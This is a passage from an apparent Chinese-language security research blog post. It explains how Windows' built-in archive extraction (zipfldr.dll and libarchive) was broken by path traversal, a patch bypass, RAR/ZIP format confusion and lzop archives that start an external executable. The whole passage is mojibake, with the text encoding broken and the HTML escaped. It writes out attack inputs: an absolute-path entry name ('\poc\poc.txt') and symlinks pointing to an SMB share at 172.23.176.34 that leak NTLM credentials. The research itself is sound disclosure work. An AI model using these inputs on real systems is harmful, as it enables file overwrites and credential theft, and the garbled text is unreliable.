highlighter-rouge&quot;&gt;_&lt;/code&gt;ã€å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; æ›¿æ›æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;ã€‚æ­¤å¤–ï¼Œèˆ‡ã€ŒCompressed (zipped) Folderã€æˆ– ã€ŒCompressed Archive Folderã€äº’å‹•æ™‚ï¼Œä½¿ç”¨è€…ç¸½å…±æœ‰ä¸‰å€‹æ–¹å¼å¯ä»¥é€²è¡Œè§£å£“ç¸®ï¼Œé€™ä¸‰å€‹è¡Œç‚ºå„è‡ªè§¸ç™¼äº†ä¸åŒçš„ functionï¼Œåˆ†åˆ¥æ˜¯ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é»å…©ä¸‹å£“ç¸®æª”æ¡ˆä¸­çš„æª”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;è§¸ç™¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é»å…©ä¸‹å£“ç¸®æª”æ¡ˆä¸­çš„ cmdã€batã€exe æª”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;è§¸ç™¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractEntireArchive&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å°å£“ç¸®æª”æ¡ˆé»æ“Šå³éµï¼Œé»æ“Šé¸å–®ä¸­çš„ã€ŒExtract Allã€
    &lt;ul&gt;
      &lt;li&gt;è§¸ç™¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveExtractWizard::ExtractToDestination&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é€†å‘é€™äº›å‡½æ•¸ä¹‹å¾Œæˆ‘å€‘ç™¼ç¾ï¼Œå®ƒå€‘éƒ½ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_next_header&lt;/code&gt; å–å¾—å£“ç¸®æª”å…§çš„æª”æ¡ˆåç¨±ï¼Œä¸¦å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; å°åç¨±é€²è¡Œéæ¿¾ã€‚ä½†å»å¿˜è¨˜åœ¨ã€Œé»å…©ä¸‹å£“ç¸®æª”æ¡ˆä¸­çš„æª”æ¡ˆã€å°æ‡‰çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt; ä¸­åšé€™ä»¶äº‹æƒ…ï¼Œå°è‡´ä»»æ„æª”æ¡ˆå¯«ã€ä»»æ„æª”æ¡ˆåˆªé™¤çš„ç™¼ç”Ÿã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-38165-ç¹é-cve-2024-26185-çš„ä¿®è£œ&quot;&gt;CVE-2024-38165ï¼š ç¹é CVE-2024-26185 çš„ä¿®è£œ&lt;/h3&gt;

&lt;p&gt;åœ¨å¾®è»Ÿä¿®å¾© CVE-2024-26185 ä¹‹å¾Œï¼Œæˆ‘å€‘ç¨å¾®å° patch é€²è¡Œäº†æª¢æŸ¥ï¼Œéš¨æ©Ÿçš„åŸ·è¡Œäº†ä¸€äº› PoCï¼Œçµæœç™¼ç¾å…¶ä¸­ä¸€äº›é‚„æ˜¯å¯ä»¥ç¹é Windows æœ€æ–°çš„ patchï¼Œè®“æˆ‘å€‘ä¾†çœ‹çœ‹å¾®è»Ÿæ˜¯æ€éº¼ä¿®å¾©ä¸Šä¸€å€‹æ¼æ´çš„ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ patch ä¹‹å¾Œï¼Œå¯ä»¥ç™¼ç¾å¾®è»Ÿåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt; ä¹‹å‰åŠ å…¥äº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; ä¾†å°å‚³å…¥çš„è·¯å¾‘é€²è¡Œéæ¿¾ï¼Œçœ‹èµ·ä¾†æ²’ä»€éº¼å•é¡Œã€‚
&lt;img src=&quot;/assets/img/blog/20250212/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å¯¦éš›ä¸Šï¼Œæˆ‘å€‘å¯ä»¥é€éæª”æ¡ˆåç¨±ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt; çš„æª”æ¡ˆç¹éé€™å€‹ä¿è­·ã€‚é¦–å…ˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt; æœƒå…ˆè¢«å‚³å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; é€²è¡Œéæ¿¾ï¼Œä½†ç”±æ–¼åç¨±ä¸­ä¸åŒ…å«ä»»ä½•éæ³•å­—å…ƒæ‰€ä»¥æ²’æœ‰ç”¢ç”Ÿè®ŠåŒ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹ä¾†ï¼Œç”±æ–¼ç›®å‰&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; æ­£åœ¨åšçš„äº‹æƒ…æ˜¯ã€Œå°‡æª”æ¡ˆè§£å£“ç¸®è‡³ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; ä¸‹çš„è³‡æ–™å¤¾ï¼Œè®“ä½¿ç”¨è€…èˆ‡æª”æ¡ˆäº’å‹•ã€ï¼Œå› æ­¤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; éœ€è¦å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; ä¸‹çš„æš«å­˜è³‡æ–™å¤¾è·¯å¾‘å’Œæˆ‘å€‘æä¾›çš„æª”æ¡ˆåç¨±ä¸²æ¥èµ·ä¾†ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ Windows ä¸­ï¼Œé–‹é ­ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt; æˆ–æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; é–‹é ­çš„è·¯å¾‘éƒ½è¢«è¦–ç‚ºæ ¹è·¯å¾‘ï¼Œæ‰€ä»¥å¯¦éš›ä¸Šï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; æ­£åœ¨ä¸²æ¥å…©å€‹çµ•å°è·¯å¾‘ã€‚è€Œæ ¹æ“š &lt;a href=&quot;https://github.com/microsoft/STL/blob/90820002693fe6eaaec2e55884472c654186207e/stl/inc/filesystem#L723&quot;&gt;Path çš„ä¸²æ¥åœ¨ Windows ä¸Šçš„å¯¦ä½œ&lt;/a&gt;ï¼Œè‹¥é‡åˆ°å…©å€‹è¼¸å…¥éƒ½æ˜¯çµ•å°è·¯å¾‘æ™‚ï¼Œæœƒç›´æ¥æ‹¿å–ç¬¬äºŒå€‹çµ•å°è·¯å¾‘å›å‚³ï¼Œå› æ­¤é€™å€‹ function çš„å›å‚³å€¼ä¾¿æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\poc\poc.txt&lt;/code&gt;ï¼ŒæˆåŠŸç¹éä¿è­·ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;symlink-ntlm-exfiltration&quot;&gt;Symlink NTLM Exfiltration&lt;/h3&gt;

&lt;p&gt;åœ¨ç¼ºå°‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; çš„æƒ…æ³ä¸‹ï¼Œæˆ‘å€‘ç•¶ç„¶å¯ä»¥æ”»æ“ŠæˆåŠŸã€‚é‚£éº¼ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; æœ¬èº«çœŸçš„å®‰å…¨å—ï¼Ÿ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; åƒ…éæ¿¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt;ã€‚æˆ‘å€‘é¦¬ä¸Šå¯ä»¥ç™¼ç¾ï¼Œã€Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;ã€æ˜¯åˆæ³•çš„å­—å…ƒï¼Œæˆ–è¨±æˆ‘å€‘å¯ä»¥æ§‹é€ å‡ºé ç«¯çš„è·¯å¾‘ï¼Œå°è‡´ NTLM exfiltration ä¹‹é¡çš„å•é¡Œï¼Œæˆ‘å€‘å˜—è©¦æ§‹é€ æ­¤é¡è·¯å¾‘ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\Mup\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸éåœ¨æª”æ¡ˆç‚º regular file çš„æƒ…æ³ä¸‹ï¼Œé€™é ‚å¤šåªæœƒåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; ä¹‹ä¸‹å»ºç«‹ç›¸å°æ‡‰çš„ç›®éŒ„ï¼ˆåœ¨ä¿®è£œ CVE-2024-38165 ä¹‹å‰æ‰æœ‰ç”¨ï¼‰ï¼Œç„¡æ³•å­˜å–é ç«¯çš„æª”æ¡ˆç³»çµ±ã€‚ç„¶è€Œï¼Œå¦‚æœæˆ‘å€‘å»ºç«‹ä¸€å€‹æŒ‡å‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\poc\poc.txt&lt;/code&gt; çš„ symlinkï¼Œç•¶ä½¿ç”¨è€…è§¸ç™¼ã€ŒExtract Allã€æˆ–æ˜¯é»å…©ä¸‹äº’å‹•æ™‚ï¼Œæª”æ¡ˆç¸½ç®¡ä¾¿æœƒå˜—è©¦å»èˆ‡è©² IP çš„ SMB é€²è¡Œäº’å‹•ï¼Œå°è‡´ NTLM leak:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸¦ä¸”ï¼Œåœ¨å°šæœªè§£å£“ç¸®å‰ï¼ŒWindows åƒ…ä½¿ç”¨å‰¯æª”ååˆ¤æ–·å£“ç¸®æª”æ¡ˆå…§çš„æª”æ¡ˆé¡å‹ï¼Œæ¬ºé¨™æ€§æ¥µé«˜ã€‚ä»¥æ­¤è™•ç‚ºä¾‹ï¼Œæˆ‘å€‘çš„ symlink æª”æ¡ˆå°±è¢«ç•¶ä½œ Text Documentï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸éï¼Œåœ¨è§£å£“ç¸®æ™‚ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; æ˜¯é€é &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-createsymboliclinka&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt;&lt;/a&gt; é€™å€‹ API ä¾†å»ºç«‹ symlinkã€‚å‘¼å«çš„ç¨‹å¼å¿…é ˆæœ‰é«˜æ¬Šé™æ‰èƒ½å»ºç«‹ symlinkï¼Œè€Œåœ¨è§£å£“ç¸®æ™‚ï¼Œæª”æ¡ˆç¸½ç®¡ä¸¦ä¸æœƒè¦æ±‚ä»»ä½•æ¬Šé™ï¼Œè€Œæ˜¯ç›´æ¥å ±éŒ¯ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é›–ç„¶æª”æ¡ˆç¸½ç®¡åœ¨å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt; æ™‚ï¼Œæœ‰å•Ÿç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE&lt;/code&gt;ï¼Œä½†æ‰‹å†Šä¸­èªªåˆ°å¿…é ˆè¦é–‹å•Ÿé–‹ç™¼äººå“¡æ¨¡å¼ï¼Œæ‰èƒ½ä½¿æ­¤ flag ä½œç”¨ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ç›®å‰é€™å€‹å¼±é»åªèƒ½ç”¨ä¾†æ”»æ“Šç®¡ç†å“¡æˆ–æ˜¯é–‹ç™¼è€…ï¼Œæ„Ÿè¦ºé‚„æ˜¯ä¸€å€‹ä¸å®Œæ•´çš„åŠŸèƒ½ã€‚å› æ­¤ï¼Œé€™å€‹å¼±é»è¢«åˆ¤å®šç‚ºä¸å„ªå…ˆä¿®å¾©ã€‚&lt;/p&gt;

&lt;h2 id=&quot;libarchive&quot;&gt;Libarchive&lt;/h2&gt;

&lt;p&gt;å‰ä¸€éƒ¨åˆ†æåˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; è² è²¬è™•ç†èˆ‡ã€ŒCompressed (zipped) Folderã€ã€ã€ŒCompressed Archive Folderã€äº’å‹•çš„é‚è¼¯ã€‚ä½†å¯¦éš›ä¸Šè² è²¬è§£å£“ç¸®çš„æ˜¯ libarchiveï¼Œåœ¨ Windows ç³»çµ±ä¸Šå°æ‡‰çš„ DLL æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;ã€‚ libarchive è¢«å»£æ³›ä½¿ç”¨åœ¨ Linuxã€BSDã€macOS ç­‰ä½œæ¥­ç³»çµ±ï¼Œä»¥åŠ ClickHouseã€Homebrewã€Osquery ç­‰ç­‰çŸ¥åå¤§å‹å°ˆæ¡ˆä¸­ã€‚è‡ª 2016 èµ·ï¼ŒGoogle çš„ OSS-Fuzz å°ˆæ¡ˆä¾¿ 24 å°æ™‚ä¸é–“æ–·åœ°å°å…¶é€²è¡Œæ¨¡ç³Šæ¸¬è©¦ï¼Œæ˜¯æ­·ç¶“æ™‚é–“è€ƒé©—çš„å‡½å¼åº«ã€‚åœ¨é»‘ç®±æ¸¬è©¦æ™‚ï¼Œæˆ‘å€‘è§€å¯Ÿåˆ°ä¸‹åˆ—å¹¾ä»¶æœ‰è¶£çš„äº‹æƒ…ã€‚&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-1-windows-supports-file-formats-more-than-they-claimed&quot;&gt;Fun Fact 1: Windows Supports File Formats More Than They Claimed&lt;/h3&gt;

&lt;p&gt;é›–ç„¶å¾®è»Ÿåœ¨ KB5031455 æ›´æ–°ä¸­å®£ç¨±ä»–å€‘æ–°å¢äº†ä»¥ä¸‹ 11 ç¨®å£“ç¸®æ ¼å¼çš„åŸç”Ÿæ”¯æ´ï¼Œä½†å¯¦éš›ä¸Šä»–å€‘æ‰€æ”¯æ´çš„æª”æ¡ˆæ ¼å¼é é è¶…é 11 ç¨®ã€‚
&lt;img src=&quot;/assets/img/blog/20250212/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; ä¸­æˆ‘å€‘çœ‹åˆ° ï¼·indows æ˜¯é€™æ¨£è¨­å®š libarchive çš„ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å¯¦éš›ä¸Šï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; æœƒå•Ÿç”¨ libarchive ä¸­ arã€cpioã€lhaã€mtreeã€tarã€xarã€warcã€7zipã€cabã€rarã€rar5ã€iso9660ã€zip ç­‰ 13 ç¨®å£“ç¸®æª”æ¡ˆæ ¼å¼ï¼›&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; æœƒå•Ÿç”¨ libarchive ä¸­ bzip2ã€compressã€gzipã€lzipã€lzmaã€xzã€uuã€rpmã€lrzipã€lzopã€grzipã€lz4ã€zstd ç­‰ 13 ç¨®æ ¼å¼ã€‚&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ format èˆ‡ filter å¯ä»¥åŒæ™‚ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼Œæ”¯æ´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar.gz&lt;/code&gt; æ ¼å¼å³æ˜¯åŒæ™‚å•Ÿç”¨ format ä¸­çš„ tar èˆ‡ filter ä¸­çš„ gzipã€‚æ‰€ä»¥å¯¦éš›ä¸Š Windows 11 æ”¯æ´äº† 13+13+13Ã—13=195 ç¨®æ ¼å¼å—ï¼Ÿ&lt;/p&gt;

&lt;p&gt;å¤§éŒ¯ç‰¹éŒ¯ï¼Œfilter æœ€å¤šå¯ä»¥ä¸²é€£ 25 å€‹ï¼Œä¾‹å¦‚ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive.rar.gzip.xz.uu.zstd.uu......&lt;/code&gt; ä¹Ÿå°±æ˜¯èªª Windows 11 å¯¦éš›ä¸Šæ”¯æ´äº† 13+13+13Ã—13Â²âµ ç¨®æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91733330193268616658399616035&lt;/code&gt; ç¨®æ ¼å¼ï¼ä½›å¿ƒå…¬å¸ï¼ä½›å¿ƒå…¬å¸ï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ä¹Ÿå› æ­¤ï¼Œæ›´æ–°å¾Œçš„æ”»æ“Šé¢å¤§å¹…æ“´å±•ã€‚åªè¦ libarchive ä¸­çš„ä»»ä¸€æª”æ¡ˆæ ¼å¼å­˜åœ¨æ¼æ´ï¼Œåœ¨ Windows ä¸Šéƒ½å¯ä»¥è¢«è§¸ç™¼ã€‚æ­¤å¤–ï¼ŒåŒæ™‚è§£æå¤šç¨® filter æ™‚ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å®‰å…¨å¼±é»ã€‚ç›¸è¼ƒæ–¼åŸæœ¬åƒ… 11 ç¨®æ ¼å¼çš„æƒ…æ³ï¼Œæ½›åœ¨é¢¨éšªå·²å¤§å¹…å¢åŠ ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-2-file-format-confusion&quot;&gt;Fun Fact 2: File Format Confusion&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨ libarchive æ™‚ï¼Œä¸¦ä¸éœ€è¦æä¾›å‰¯æª”åæˆ–æ˜¯æŒ‡å®šæ ¼å¼ï¼Œlibarchive æœƒæ ¹æ“šæª”æ¡ˆå…§å®¹è‡ªå‹•è¾¨è­˜ç•¶å‰æª”æ¡ˆçš„æ ¼å¼ï¼Œæ¥è‘—ä»¥å°æ‡‰çš„æ–¹å¼é€²è¡Œè§£å£“ç¸®ã€‚ä½†åœ¨å•Ÿç”¨ ZIP çš„æƒ…æ³ä¸‹å¯èƒ½æœƒæœ‰ File Format Confusion çš„ç‹€æ³ç™¼ç”Ÿã€‚èˆ‰å€‹ä¾‹å­ï¼Œå¦‚æœæˆ‘å€‘å»ºç«‹ä¸€å€‹ demo3.rarï¼Œä¸¦ä¸”è£¡é¢æ”¾å…¥ä¸€å€‹ poc.zip çš„æª”æ¡ˆï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœæˆ‘å€‘åœ¨ Windows ä¸Šç›´æ¥é»å…©ä¸‹ demo3.rar é–‹å•Ÿçš„è©±ï¼Œæœƒç™¼ç¾æˆ‘å€‘åƒ…èƒ½çœ‹åˆ° poc2.txt é€™å€‹æ–‡å­—æª”æ¡ˆï¼Œå…¶é¤˜çš„è³‡æ–™å¤¾ã€æª”æ¡ˆï¼Œç”šè‡³ poc.zip éƒ½ä¸å­˜åœ¨ã€‚å› ç‚º libarchive å°‡ demo3.rar èª¤èªç‚ºä¸€å€‹ ZIP æª”æ¡ˆï¼&lt;/p&gt;

&lt;p&gt;ç‚ºäº†ç†è§£åŸå› ï¼Œæˆ‘å€‘é¦–å…ˆè§€å¯Ÿä¸€ä¸‹ libarchive æ˜¯å¦‚ä½•é¸å®šæª”æ¡ˆæ ¼å¼çš„ã€‚libarchive æœƒåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;choose_format&lt;/code&gt; é€™å€‹å‡½å¼ä¸­ï¼Œå‘¼å«å·²å•Ÿç”¨çš„ format çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; å‡½å¼ï¼Œè€Œå“ªå€‹æ ¼å¼çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; å›å‚³çš„æ•¸å€¼æœ€é«˜ï¼Œlibarchive å°±æœƒå°‡æª”æ¡ˆç•¶ä½œè©²æ ¼å¼è™•ç†ã€‚
&lt;img src=&quot;/assets/img/blog/20250212/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ar&lt;/code&gt; ç‚ºä¾‹ï¼Œå¦‚æœæª”æ¡ˆçš„èµ·é ­æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;!&amp;lt;arch&amp;gt;\n&quot;&lt;/code&gt; é€™ 8 å€‹å­—å…ƒï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_format_ar_bid&lt;/code&gt; å°±æœƒå›å‚³ 64ï¼Œæ¨æ¸¬æ˜¯ 8ğ‘ğ‘–ğ‘¡ğ‘  Ã— 8ğ‘ğ‘¦ğ‘¡ğ‘’ğ‘  = 64ï¼Œçœ‹èµ·ä¾†å¥½åƒæŒºæœ‰é“ç†çš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—ï¼Œçœ‹åˆ° RAR çš„æ ¼å¼å¯ä»¥ç™¼ç¾å®ƒæœ€é«˜çš„åˆ†æ•¸åªæœƒæ˜¯ 30ã€‚é›–ç„¶ 30 ä¸çŸ¥é“æ€éº¼ç®—ä¾†çš„ï¼Œä½†å¦‚æœæ¯å€‹æª”æ¡ˆæ ¼å¼éƒ½æ˜¯å¾æª”æ¡ˆçš„èµ·é ­é–‹å§‹æª¢æŸ¥ï¼Œæ‡‰è©²ä¹Ÿå¾ˆé›£åšå‡ºæœƒè®“é€™å€‹æ©Ÿåˆ¶å£æ‰çš„ polyglotï¼Œå°å§ï¼Ÿ
&lt;img src=&quot;/assets/img/blog/20250212/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†ï¼Œlibarchive çš„ ZIP ä¸­æœ‰å€‹ç¥å¥‡çš„æ¨¡å¼ï¼šseekableã€‚ä¹Ÿå°±æ˜¯ ZIP çš„ signature ä¸éœ€è¦åœ¨æª”æ¡ˆçš„é–‹é ­ï¼Œlibarchive æœƒè‡ªè¡Œå»å°‹æ‰¾ï¼Œè€Œ seekable zip æœ€é«˜çš„æ•¸å€¼ç‚º 32:
&lt;img src=&quot;/assets/img/blog/20250212/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥ç•¶ RAR å£“ç¸®ç‡ä¸è¶³ï¼Œé‚„ä¿ç•™æœ‰ ZIP çš„ signature æ™‚ï¼Œlibarchive æœƒå°‡åŒ…æœ‰ ZIP æª”æ¡ˆçš„ RAR æª”æ¡ˆç•¶ä½œ ZIP ä¾†è™•ç†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-3-sometimes-libarchive-tries-to-spawn-an-external-executable&quot;&gt;Fun Fact 3: Sometimes, Libarchive Tries to Spawn an External Executable&lt;/h3&gt;

&lt;p&gt;åœ¨ libarchive çš„ source code ä¸­å¯ä»¥ç™¼ç¾ï¼Œå¦‚æœç·¨è­¯æ™‚ç¼ºå°‘ä¸€äº› libraryï¼Œlibarchive åŸ·è¡Œæ™‚æœƒå˜—è©¦ç›´æ¥å‘¼å«å¤–éƒ¨æŒ‡ä»¤ä¾†å”åŠ©è§£å£“ç¸®ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœ decompile Windows ä¸­å°æ‡‰çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;ï¼Œå¯ä»¥ç™¼ç¾æŸäº›æ ¼å¼ç¢ºå¯¦æœƒå‘¼å«å¤–éƒ¨çš„åŸ·è¡Œæª”æ¡ˆï¼Œä»¥ lzop çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt; ç‚ºä¾‹ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å› æ­¤ï¼Œæ ¹æ“šã€Œlibarchive æœƒè‡ªè¡Œæ ¹æ“šæª”æ¡ˆå…§å®¹æ±ºå®šç”¨ä»€éº¼æ ¼å¼é€²è¡Œè§£å£“ç¸®ã€çš„äº‹å¯¦ï¼Œæˆ‘å€‘åªè¦å°‡ä¸€å€‹ lzop æ ¼å¼çš„å£“ç¸®æª”æ¡ˆçš„å‰¯æª”åæ”¹ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt;ï¼Œå°å…¶é»å…©ä¸‹é–‹å•Ÿï¼Œå°±èƒ½è§¸ç™¼å°æ‡‰çš„ lzop è§£å£“ç¸®å‡½å¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt;ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—å°±æœƒçœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt; å˜—è©¦ä½¿ç”¨å¤–éƒ¨æŒ‡ä»¤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop -d&lt;/code&gt; ä¾†é€²è¡Œè§£å£“ç¸®ã€‚çµæœå°±æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; æœƒå» &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; ä¸­å°‹æ‰¾æœ‰æ²’æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop.exe&lt;/code&gt; å­˜åœ¨ï¼Œä¸¦å˜—è©¦åŸ·è¡Œï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rces-reported-by-morse-cve-2024-20696-and-cve-2024-20697&quot;&gt;RCEs Reported by MORSE: CVE-2024-20696 and CVE-2024-20697&lt;/h3&gt;

